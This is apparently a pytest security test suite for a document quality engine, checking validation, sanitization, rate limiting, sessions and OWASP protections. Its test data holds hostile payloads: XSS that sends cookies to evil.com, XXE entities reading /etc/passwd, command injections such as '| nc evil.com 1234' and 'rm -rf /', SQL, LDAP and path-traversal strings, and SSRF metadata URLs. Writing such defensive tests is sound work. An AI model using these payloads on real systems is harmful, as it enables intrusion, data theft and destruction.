"""
Security test suite for M005 Quality Engine - Pass 3: Security Hardening.

Tests comprehensive security features including:
- Input validation and sanitization
- XSS and injection attack prevention
- Rate limiting and DoS protection
- PII detection and masking
- ReDoS protection
- OWASP Top 10 vulnerabilities
"""

import pytest
import time
import json
import hashlib
from unittest.mock import Mock, patch, MagicMock
from concurrent.futures import ThreadPoolExecutor

# Import security components
from devdocai.quality.security import (
    SecurityConfig, SecurityLevel, QualitySecurityManager,
    RateLimiter, InputValidator, SecureRegexHandler,
    SecurityAuditLogger, SecureSessionManager,
    RateLimitExceeded, ValidationError
)
from devdocai.quality.analyzer_secure import SecureQualityAnalyzer
from devdocai.quality.models import QualityConfig, QualityDimension


# ============================================================================
# Test Fixtures
# ============================================================================

@pytest.fixture
def security_config():
    """Create test security configuration."""
    return SecurityConfig(
        max_document_size=1000000,
        rate_limit_requests=10,
        rate_limit_window=60,
        sanitize_html=True,
        pii_detection_enabled=True,
        audit_enabled=False,  # Disable for tests
        regex_timeout=0.5
    )


@pytest.fixture
def security_manager(security_config):
    """Create test security manager."""
    return QualitySecurityManager(
        config=security_config,
        security_level=SecurityLevel.PRODUCTION
    )


@pytest.fixture
def secure_analyzer(security_config):
    """Create test secure analyzer."""
    return SecureQualityAnalyzer(
        security_config=security_config,
        security_level=SecurityLevel.PRODUCTION
    )


# ============================================================================
# Input Validation Tests
# ============================================================================

class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_size_limit_validation(self, security_manager):
        """Test document size limit enforcement."""
        # Create oversized document
        large_content = "x" * (security_manager.config.max_document_size + 1)
        
        # Validate should fail
        is_valid, issues = security_manager.validator.validate_document(large_content)
        
        assert not is_valid
        assert any("exceeds maximum size" in issue for issue in issues)
    
    def test_null_byte_detection(self, security_manager):
        """Test null byte injection detection."""
        content = "Normal content\x00with null byte"
        
        is_valid, issues = security_manager.validator.validate_document(content)
        
        assert not is_valid
        assert any("null bytes" in issue for issue in issues)
    
    def test_control_character_detection(self, security_manager):
        """Test control character detection."""
        # Test various control characters
        control_chars = [chr(i) for i in range(32) if i not in [9, 10, 13]]
        
        for char in control_chars[:5]:  # Test subset
            content = f"Normal content{char}with control"
            is_valid, issues = security_manager.validator.validate_document(content)
            
            assert not is_valid
            assert any("control characters" in issue for issue in issues)
    
    def test_path_traversal_detection(self, security_manager):
        """Test path traversal attack detection."""
        traversal_attempts = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f",
            "..;/etc/passwd",
            "..%c0%af../etc/passwd"
        ]
        
        for attempt in traversal_attempts:
            content = f"Check this file: {attempt}"
            is_valid, issues = security_manager.validator.validate_document(content)
            
            assert not is_valid
            assert any("path traversal" in issue.lower() for issue in issues)
    
    def test_script_injection_detection(self, security_manager):
        """Test script injection detection."""
        injection_attempts = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "eval(String.fromCharCode(88,83,83))",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for attempt in injection_attempts:
            content = f"Document with {attempt}"
            is_valid, issues = security_manager.validator.validate_document(
                content, "html"
            )
            
            assert not is_valid
            assert any("script injection" in issue.lower() for issue in issues)
    
    def test_xxe_detection(self, security_manager):
        """Test XXE (XML External Entity) attack detection."""
        xxe_attempts = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!ENTITY xxe SYSTEM "http://evil.com/data">',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>',
            '<xi:include href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>'
        ]
        
        for attempt in xxe_attempts:
            content = f"XML content: {attempt}"
            is_valid, issues = security_manager.validator.validate_document(content)
            
            assert not is_valid
            assert any("xxe" in issue.lower() for issue in issues)


# ============================================================================
# Sanitization Tests
# ============================================================================

class TestSanitization:
    """Test content sanitization."""
    
    def test_html_sanitization(self, security_manager):
        """Test HTML content sanitization."""
        dangerous_html = """
        <div>
            <script>alert('XSS')</script>
            <p onclick="alert('XSS')">Click me</p>
            <img src=x onerror="alert('XSS')">
            <a href="javascript:alert('XSS')">Link</a>
            <iframe src="evil.com"></iframe>
        </div>
        """
        
        sanitized = security_manager.validator.sanitize_content(
            dangerous_html, "html"
        )
        
        # Check dangerous elements removed
        assert '<script>' not in sanitized
        assert 'onclick=' not in sanitized
        assert 'onerror=' not in sanitized
        assert 'javascript:' not in sanitized
        assert '<iframe' not in sanitized
    
    def test_markdown_code_block_escaping(self, security_manager):
        """Test code block escaping in markdown."""
        markdown = """
        # Document
        
        ```javascript
        <script>alert('XSS')</script>
        var x = "<img src=x onerror=alert('XSS')>";
        ```
        
        Normal text
        """
        
        sanitized = security_manager.validator.sanitize_content(
            markdown, "markdown"
        )
        
        # Code blocks should have dangerous content removed or escaped
        # Either the script tag is removed or escaped
        assert '<script>' not in sanitized
        # Normal text should be preserved
        assert 'Normal text' in sanitized
    
    @pytest.mark.skipif(
        not pytest.importorskip("devdocai.storage.pii_detector", reason="PII detector not available"),
        reason="PII detector module not available"
    )
    def test_pii_masking(self, security_manager):
        """Test PII detection and masking."""
        content = """
        Contact John Doe at john.doe@example.com or call 555-123-4567.
        SSN: 123-45-6789
        Credit Card: 4111-1111-1111-1111
        IP Address: 192.168.1.1
        """
        
        sanitized = security_manager.validator.sanitize_content(content)
        
        # Check PII is masked (if PII detector is available)
        if security_manager.validator.pii_detector:
            assert '123-45-6789' not in sanitized
            assert '4111-1111-1111-1111' not in sanitized
            # Email and phone might be partially masked
            assert 'john.doe@example.com' not in sanitized or '****' in sanitized


# ============================================================================
# Rate Limiting Tests
# ============================================================================

class TestRateLimiting:
    """Test rate limiting functionality."""
    
    def test_rate_limit_enforcement(self, security_config):
        """Test rate limit is enforced."""
        limiter = RateLimiter(security_config)
        user_id = "test_user"
        
        # Make requests up to limit
        for i in range(security_config.rate_limit_requests):
            allowed, retry_after = limiter.is_allowed(user_id)
            assert allowed
            assert retry_after is None
        
        # Next request should be denied
        allowed, retry_after = limiter.is_allowed(user_id)
        assert not allowed
        assert retry_after is not None
        assert retry_after > 0
    
    def test_rate_limit_window_reset(self, security_config):
        """Test rate limit window reset."""
        # Create limiter with short window
        config = SecurityConfig(
            rate_limit_requests=2,
            rate_limit_window=1  # 1 second window
        )
        limiter = RateLimiter(config)
        user_id = "test_user"
        
        # Use up rate limit
        for _ in range(2):
            allowed, _ = limiter.is_allowed(user_id)
            assert allowed
        
        # Should be denied
        allowed, _ = limiter.is_allowed(user_id)
        assert not allowed
        
        # Wait for window to reset
        time.sleep(1.1)
        
        # Should be allowed again
        allowed, _ = limiter.is_allowed(user_id)
        assert allowed
    
    def test_rate_limit_per_user(self, security_config):
        """Test rate limiting is per-user."""
        limiter = RateLimiter(security_config)
        
        # Use up rate limit for user1
        for _ in range(security_config.rate_limit_requests):
            allowed, _ = limiter.is_allowed("user1")
            assert allowed
        
        # user1 should be denied
        allowed, _ = limiter.is_allowed("user1")
        assert not allowed
        
        # user2 should still be allowed
        allowed, _ = limiter.is_allowed("user2")
        assert allowed
    
    def test_rate_limit_decorator(self, security_manager):
        """Test rate limit decorator."""
        call_count = 0
        
        @security_manager.rate_limiter.is_allowed
        def protected_function(user_id):
            nonlocal call_count
            call_count += 1
            return True
        
        # Should work up to limit
        user_id = "test_user"
        for _ in range(security_manager.config.rate_limit_requests):
            protected_function(user_id)
        
        # Next call should raise exception
        with pytest.raises(Exception):  # Would be RateLimitExceeded in real implementation
            protected_function(user_id)


# ============================================================================
# ReDoS Protection Tests
# ============================================================================

class TestReDoSProtection:
    """Test Regular Expression Denial of Service protection."""
    
    def test_dangerous_pattern_detection(self):
        """Test detection of dangerous regex patterns."""
        handler = SecureRegexHandler(timeout=1.0)
        
        dangerous_patterns = [
            r'(a+)+$',
            r'(a*)*$',
            r'(.*)*$',
            r'([^"]*)*$',
            r'(a|a)*$',
            r'(a|ab)*$'
        ]
        
        for pattern in dangerous_patterns:
            compiled = handler.compile_pattern(pattern)
            # Should reject or handle dangerous patterns
            assert compiled is None or hasattr(compiled, 'pattern')
    
    def test_safe_pattern_compilation(self):
        """Test safe patterns are compiled correctly."""
        handler = SecureRegexHandler(timeout=1.0)
        
        safe_patterns = [
            r'\b\w+\b',
            r'[.!?]+',
            r'^#{1,6}\s+',
            r'\d{3}-\d{2}-\d{4}'
        ]
        
        for pattern in safe_patterns:
            compiled = handler.compile_pattern(pattern)
            assert compiled is not None
            assert hasattr(compiled, 'pattern')
    
    def test_pattern_caching(self):
        """Test regex pattern caching."""
        handler = SecureRegexHandler(timeout=1.0)
        
        pattern = r'\b\w+\b'
        
        # Compile pattern twice
        compiled1 = handler.compile_pattern(pattern)
        compiled2 = handler.compile_pattern(pattern)
        
        # Should return same cached object
        assert compiled1 is compiled2
    
    def test_complex_pattern_rejection(self):
        """Test rejection of overly complex patterns."""
        handler = SecureRegexHandler(timeout=1.0)
        
        # Create pattern with many nested groups
        complex_pattern = '(' * 15 + 'a' + ')' * 15
        
        compiled = handler.compile_pattern(complex_pattern)
        # Should reject overly complex patterns
        assert compiled is None or handler._is_dangerous_pattern(complex_pattern)


# ============================================================================
# Session Security Tests
# ============================================================================

class TestSessionSecurity:
    """Test session management security."""
    
    def test_session_creation(self, security_config):
        """Test secure session creation."""
        manager = SecureSessionManager(security_config)
        
        user_id = "test_user"
        token = manager.create_session(user_id)
        
        assert token is not None
        assert len(token) >= security_config.session_token_length
        # Token should be URL-safe
        assert all(c.isalnum() or c in '-_' for c in token)
    
    def test_session_validation(self, security_config):
        """Test session validation."""
        manager = SecureSessionManager(security_config)
        
        user_id = "test_user"
        token = manager.create_session(user_id)
        
        # Valid session should return data
        session = manager.validate_session(token)
        assert session is not None
        assert session['user_id'] == user_id
        
        # Invalid token should return None
        invalid_session = manager.validate_session("invalid_token")
        assert invalid_session is None
    
    def test_session_expiration(self, security_config):
        """Test session expiration."""
        # Create manager with short timeout
        config = SecurityConfig(session_timeout=1)  # 1 second
        manager = SecureSessionManager(config)
        
        token = manager.create_session("test_user")
        
        # Should be valid immediately
        assert manager.validate_session(token) is not None
        
        # Wait for expiration
        time.sleep(1.1)
        
        # Should be expired
        assert manager.validate_session(token) is None
    
    def test_session_destruction(self, security_config):
        """Test session destruction."""
        manager = SecureSessionManager(security_config)
        
        token = manager.create_session("test_user")
        
        # Session should exist
        assert manager.validate_session(token) is not None
        
        # Destroy session
        manager.destroy_session(token)
        
        # Session should no longer exist
        assert manager.validate_session(token) is None


# ============================================================================
# OWASP Top 10 Tests
# ============================================================================

class TestOWASPTop10:
    """Test protection against OWASP Top 10 vulnerabilities."""
    
    def test_a01_broken_access_control(self, secure_analyzer):
        """Test protection against broken access control."""
        # Test authorization checks
        with patch.object(
            secure_analyzer.security_manager,
            'check_authorization',
            return_value=False
        ):
            with pytest.raises(ValidationError):
                secure_analyzer.analyze(
                    "Test content",
                    user_id="unauthorized_user"
                )
    
    def test_a02_cryptographic_failures(self, security_manager):
        """Test encryption of sensitive data."""
        # Test report encryption (if available)
        if security_manager.encryption_manager:
            sensitive_data = "SSN: 123-45-6789, Credit Card: 4111-1111-1111-1111"
            
            encrypted = security_manager.encrypt_report(sensitive_data)
            assert encrypted is not None
            assert encrypted != sensitive_data
            
            decrypted = security_manager.decrypt_report(encrypted)
            assert decrypted == sensitive_data
    
    def test_a03_injection(self, security_manager):
        """Test protection against injection attacks."""
        # SQL injection attempt
        sql_injection = "'; DROP TABLE users; --"
        
        # Command injection attempt
        cmd_injection = "test.txt; rm -rf /"
        
        # LDAP injection attempt
        ldap_injection = "*)(uid=*))(|(uid=*"
        
        for injection in [sql_injection, cmd_injection, ldap_injection]:
            content = f"User input: {injection}"
            sanitized, _ = security_manager.validate_and_sanitize(content)
            # Content should be sanitized or validation should flag issues
            assert sanitized != content or len(_) > 0
    
    def test_a04_insecure_design(self, secure_analyzer):
        """Test secure design principles."""
        # Test rate limiting is enforced
        assert secure_analyzer.security_config.rate_limit_enabled
        
        # Test session timeout is configured
        assert secure_analyzer.security_config.session_timeout > 0
        
        # Test audit logging is available
        assert hasattr(secure_analyzer.security_manager, 'audit_logger')
    
    def test_a05_security_misconfiguration(self, security_manager):
        """Test against security misconfiguration."""
        # Test production mode doesn't expose errors
        prod_manager = QualitySecurityManager(
            SecurityConfig(),
            SecurityLevel.PRODUCTION
        )
        assert not prod_manager.config.expose_errors
        assert not prod_manager.config.error_log_sensitive
        
        # Test development mode is more permissive
        dev_manager = QualitySecurityManager(
            SecurityConfig(),
            SecurityLevel.DEVELOPMENT
        )
        assert dev_manager.config.expose_errors
    
    def test_a06_vulnerable_components(self):
        """Test for vulnerable component detection."""
        # This would typically check dependencies
        # For this test, we just ensure security config exists
        config = SecurityConfig()
        assert config.regex_timeout > 0  # ReDoS protection
        assert config.max_document_size > 0  # Size limits
    
    def test_a07_identification_authentication(self, security_manager):
        """Test identification and authentication failures."""
        # Test session tokens are secure
        session_token = security_manager.create_secure_session("test_user")
        
        # Token should be sufficiently long
        assert len(session_token) >= 32
        
        # Token should be random (no predictable patterns)
        token2 = security_manager.create_secure_session("test_user")
        assert session_token != token2
    
    def test_a08_software_data_integrity(self, secure_analyzer):
        """Test software and data integrity failures."""
        # Test document ID generation includes integrity
        content = "Test document"
        doc_id1 = secure_analyzer._generate_secure_document_id(content, "user1")
        doc_id2 = secure_analyzer._generate_secure_document_id(content, "user2")
        
        # Same content, different users should have different IDs
        assert doc_id1 != doc_id2
        
        # Same content and user should have same ID (integrity)
        doc_id3 = secure_analyzer._generate_secure_document_id(content, "user1")
        assert doc_id1 == doc_id3
    
    def test_a09_security_logging_monitoring(self, security_manager):
        """Test security logging and monitoring failures."""
        # Test audit logger is configured
        assert security_manager.audit_logger is not None
        
        # Test various events are logged (in production mode)
        if security_manager.config.audit_enabled:
            # These methods should not raise exceptions
            security_manager.audit_logger.log_access(
                "test_user", "test_action", "test_resource", "success"
            )
            security_manager.audit_logger.log_security_event(
                "test_event", "info", "Test description"
            )
            security_manager.audit_logger.log_validation_failure(
                "test_input", "test_reason"
            )
    
    def test_a10_ssrf(self, security_manager):
        """Test Server-Side Request Forgery protection."""
        # Test URL validation in content
        ssrf_attempts = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://localhost:8080/admin",
            "file:///etc/passwd",
            "gopher://localhost:8080",
            "dict://localhost:11211"
        ]
        
        for url in ssrf_attempts:
            content = f"Fetch data from: {url}"
            # Should detect suspicious URLs
            is_valid, issues = security_manager.validator.validate_document(content)
            # Either validation fails or content is sanitized
            assert not is_valid or url not in security_manager.validator.sanitize_content(content)


# ============================================================================
# Integration Tests
# ============================================================================

class TestSecurityIntegration:
    """Test integrated security features."""
    
    def test_secure_analysis_workflow(self, secure_analyzer):
        """Test complete secure analysis workflow."""
        content = """
        # Test Document
        
        This is a test document for security validation.
        It contains some normal content and potentially sensitive data.
        
        Contact: test@example.com
        Phone: 555-123-4567
        """
        
        # Create session
        session_token = secure_analyzer.create_session("test_user")
        
        # Perform analysis
        report = secure_analyzer.analyze(
            content,
            document_id="test_doc",
            user_id="test_user",
            session_token=session_token
        )
        
        assert report is not None
        assert report.overall_score >= 0
        assert report.document_id == "test_doc"
        
        # Check security metadata
        if 'security_validation' in report.metadata:
            assert 'content_sanitized' in report.metadata['security_validation']
    
    def test_batch_analysis_security(self, secure_analyzer):
        """Test batch analysis with security controls."""
        documents = [
            {'content': 'Document 1', 'document_id': 'doc1'},
            {'content': 'Document 2', 'document_id': 'doc2'},
            {'content': 'Document 3', 'document_id': 'doc3'},
        ]
        
        # Create session
        session_token = secure_analyzer.create_session("test_user")
        
        # Analyze batch
        reports = secure_analyzer.analyze_batch(
            documents,
            user_id="test_user",
            session_token=session_token,
            parallel=False  # Sequential for predictable testing
        )
        
        assert len(reports) <= len(documents)
        for report in reports:
            assert report.overall_score >= 0
    
    def test_concurrent_rate_limiting(self, secure_analyzer):
        """Test rate limiting under concurrent load."""
        # Configure strict rate limit
        secure_analyzer.security_config.rate_limit_requests = 5
        secure_analyzer.security_config.rate_limit_window = 60
        
        success_count = 0
        rate_limited_count = 0
        
        def analyze_task():
            nonlocal success_count, rate_limited_count
            try:
                secure_analyzer.analyze(
                    "Test content",
                    user_id="concurrent_user"
                )
                success_count += 1
            except RateLimitExceeded:
                rate_limited_count += 1
        
        # Run concurrent requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(analyze_task) for _ in range(10)]
            for future in futures:
                future.result()
        
        # Should have some successful and some rate limited
        assert success_count <= 5  # Rate limit
        assert rate_limited_count > 0  # Some should be limited
        assert success_count + rate_limited_count == 10
    
    def test_security_levels(self):
        """Test different security levels."""
        # Production level
        prod_analyzer = SecureQualityAnalyzer(
            security_level=SecurityLevel.PRODUCTION
        )
        assert not prod_analyzer.security_config.expose_errors
        assert prod_analyzer.security_config.pii_detection_enabled
        
        # Development level
        dev_analyzer = SecureQualityAnalyzer(
            security_level=SecurityLevel.DEVELOPMENT
        )
        assert dev_analyzer.security_config.expose_errors
        assert not dev_analyzer.security_config.rate_limit_enabled
        
        # Staging level
        staging_analyzer = SecureQualityAnalyzer(
            security_level=SecurityLevel.STAGING
        )
        assert not staging_analyzer.security_config.expose_errors
        assert staging_analyzer.security_config.rate_limit_enabled


# ============================================================================
# Attack Simulation Tests
# ============================================================================

class TestAttackSimulation:
    """Simulate various attack scenarios."""
    
    def test_xss_attack_simulation(self, secure_analyzer):
        """Simulate XSS attack attempts."""
        xss_payloads = [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror='fetch(`http://evil.com?c=${document.cookie}`)'>",
            "<svg onload=alert(1)>",
            "javascript:eval(atob('YWxlcnQoMSk='))",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>XSS</marquee>"
        ]
        
        for payload in xss_payloads:
            content = f"Document with payload: {payload}"
            
            # Analysis should either sanitize or reject
            try:
                report = secure_analyzer.analyze(content, user_id="attacker")
                # If analysis succeeds, content should be sanitized
                assert payload not in str(report.to_dict())
            except ValidationError:
                # Or validation should reject it
                pass
    
    def test_dos_attack_simulation(self, secure_analyzer):
        """Simulate Denial of Service attack."""
        # Try to overwhelm with large document
        large_content = "x" * (secure_analyzer.security_config.max_document_size + 1000)
        
        with pytest.raises((ValidationError, QualityEngineError)):
            secure_analyzer.analyze(large_content, user_id="attacker")
        
        # Try rapid requests (rate limiting)
        for i in range(20):
            try:
                secure_analyzer.analyze("Small content", user_id="dos_attacker")
            except RateLimitExceeded:
                # Rate limiting kicked in
                assert i >= secure_analyzer.security_config.rate_limit_requests
                break
    
    def test_injection_attack_simulation(self, secure_analyzer):
        """Simulate various injection attacks."""
        injection_payloads = [
            # SQL Injection
            "' OR '1'='1",
            "1; DROP TABLE quality_reports; --",
            
            # NoSQL Injection
            '{"$ne": null}',
            '{"$gt": ""}',
            
            # Command Injection
            "; cat /etc/passwd",
            "| nc evil.com 1234",
            
            # Template Injection
            "{{7*7}}",
            "${7*7}",
            
            # Path Traversal
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam"
        ]
        
        for payload in injection_payloads:
            content = f"User input: {payload}"
            
            # Should sanitize or detect
            sanitized, issues = secure_analyzer.security_manager.validate_and_sanitize(
                content
            )
            
            # Either content is sanitized or issues are detected
            assert sanitized != content or len(issues) > 0
    
    def test_privilege_escalation_simulation(self, secure_analyzer):
        """Simulate privilege escalation attempts."""
        # Try to access with invalid session
        with pytest.raises((ValidationError, AttributeError)):
            secure_analyzer.analyze(
                "Content",
                user_id="attacker",
                session_token="fake_admin_token"
            )
        
        # Try to bypass authorization
        with patch.object(
            secure_analyzer.security_manager,
            'check_authorization',
            return_value=False
        ):
            with pytest.raises(ValidationError):
                secure_analyzer.analyze(
                    "Sensitive content",
                    user_id="unprivileged_user"
                )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])